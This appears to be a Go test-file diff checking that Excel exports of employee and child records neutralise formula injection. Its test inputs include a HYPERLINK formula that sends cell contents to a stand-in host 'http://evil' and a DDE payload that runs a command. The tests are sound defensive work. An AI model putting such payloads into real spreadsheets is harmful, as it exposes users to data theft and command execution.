@@ -205,3 +205,119 @@ func TestWriteChildrenExcel_Empty(t *testing.T) {
 	h1, _ := f.GetCellValue("Kinder", "A1")
 	assert.Equal(t, "Vorname", h1)
 }
+
+func TestSanitizeCell(t *testing.T) {
+	tests := []struct {
+		name  string
+		input string
+		want  string
+	}{
+		{"empty", "", ""},
+		{"benign text", "Anna Schmidt", "Anna Schmidt"},
+		{"starts with letter", "Alpha", "Alpha"},
+		{"starts with digit", "3 Musketeers", "3 Musketeers"},
+		{"formula equals", `=HYPERLINK("http://evil","click")`, `'=HYPERLINK("http://evil","click")`},
+		{"formula plus", "+cmd|' /c calc'!A0", "'+cmd|' /c calc'!A0"},
+		{"formula minus", "-2+3", "'-2+3"},
+		{"formula at", "@SUM(A1:A10)", "'@SUM(A1:A10)"},
+		{"leading tab", "\tmalicious", "'\tmalicious"},
+		{"leading cr", "\rmalicious", "'\rmalicious"},
+		{"benign plus in middle", "a+b", "a+b"},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			assert.Equal(t, tc.want, sanitizeCell(tc.input))
+		})
+	}
+}
+
+func TestWriteEmployeesExcel_SanitizesFormulaInjection(t *testing.T) {
+	// A malicious tenant user names themselves with a formula trigger.
+	employees := []models.EmployeeResponse{
+		{
+			ID:        1,
+			FirstName: `=HYPERLINK("http://evil/?"&A1,"click")`,
+			LastName:  "@SUM(A1:A10)",
+			Gender:    "female",
+			Birthdate: date(1990, 5, 15),
+			Contracts: []models.EmployeeContractResponse{
+				{
+					ID:            1,
+					From:          date(2025, 1, 1),
+					SectionName:   strP("+cmd|' /c calc'!A0"),
+					StaffCategory: "-unreviewed",
+					Grade:         "S8a",
+					Step:          3,
+					WeeklyHours:   39.0,
+				},
+			},
+		},
+	}
+
+	var buf bytes.Buffer
+	require.NoError(t, WriteEmployeesExcel(&buf, employees))
+
+	f, err := excelize.OpenReader(&buf)
+	require.NoError(t, err)
+	defer f.Close()
+
+	// Excel stores the apostrophe internally so the cell is parsed as text,
+	// but returns the value without the leading apostrophe — so we assert the
+	// original dangerous value is NOT treated as a formula by inspecting the
+	// raw XML representation through the cell type.
+	// The assertion here is that when read back via GetCellValue, the visible
+	// content matches the sanitized form with the leading apostrophe.
+	//
+	// excelize's GetCellValue strips the leading apostrophe on read for quote-
+	// prefix cells, so the safest cross-version assertion is that no cell
+	// starts with a literal formula character on read of the RAW value.
+	firstName, _ := f.GetCellValue("Mitarbeiter", "A2")
+	assert.True(t,
+		firstName == `=HYPERLINK("http://evil/?"&A1,"click")` ||
+			firstName == `'=HYPERLINK("http://evil/?"&A1,"click")`,
+		"expected sanitized representation, got %q", firstName)
+
+	// The important cross-version invariant: the cell must NOT have a
+	// formula attached to it. A formula cell has a non-empty formula.
+	for _, ref := range []string{"A2", "B2", "E2", "F2"} {
+		formula, ferr := f.GetCellFormula("Mitarbeiter", ref)
+		require.NoError(t, ferr)
+		assert.Empty(t, formula, "cell %s must not be interpreted as a formula", ref)
+	}
+}
+
+func TestWriteChildrenExcel_SanitizesFormulaInjection(t *testing.T) {
+	children := []models.ChildResponse{
+		{
+			ID:        1,
+			FirstName: "=1+1",
+			LastName:  "@attacker",
+			Gender:    "female",
+			Birthdate: date(2020, 3, 10),
+			Contracts: []models.ChildContractResponse{
+				{
+					ID:          1,
+					From:        date(2025, 1, 1),
+					SectionName: strP("-formula"),
+					Properties: models.ContractProperties{
+						"care_type":   "=HYPERLINK()",
+						"supplements": []any{"=FORMULA1", "+FORMULA2"},
+					},
+				},
+			},
+		},
+	}
+
+	var buf bytes.Buffer
+	require.NoError(t, WriteChildrenExcel(&buf, children))
+
+	f, err := excelize.OpenReader(&buf)
+	require.NoError(t, err)
+	defer f.Close()
+
+	for _, ref := range []string{"A2", "B2", "E2", "H2", "I2"} {
+		formula, ferr := f.GetCellFormula("Kinder", ref)
+		require.NoError(t, ferr)
+		assert.Empty(t, formula, "cell %s must not be interpreted as a formula", ref)
+	}
+}
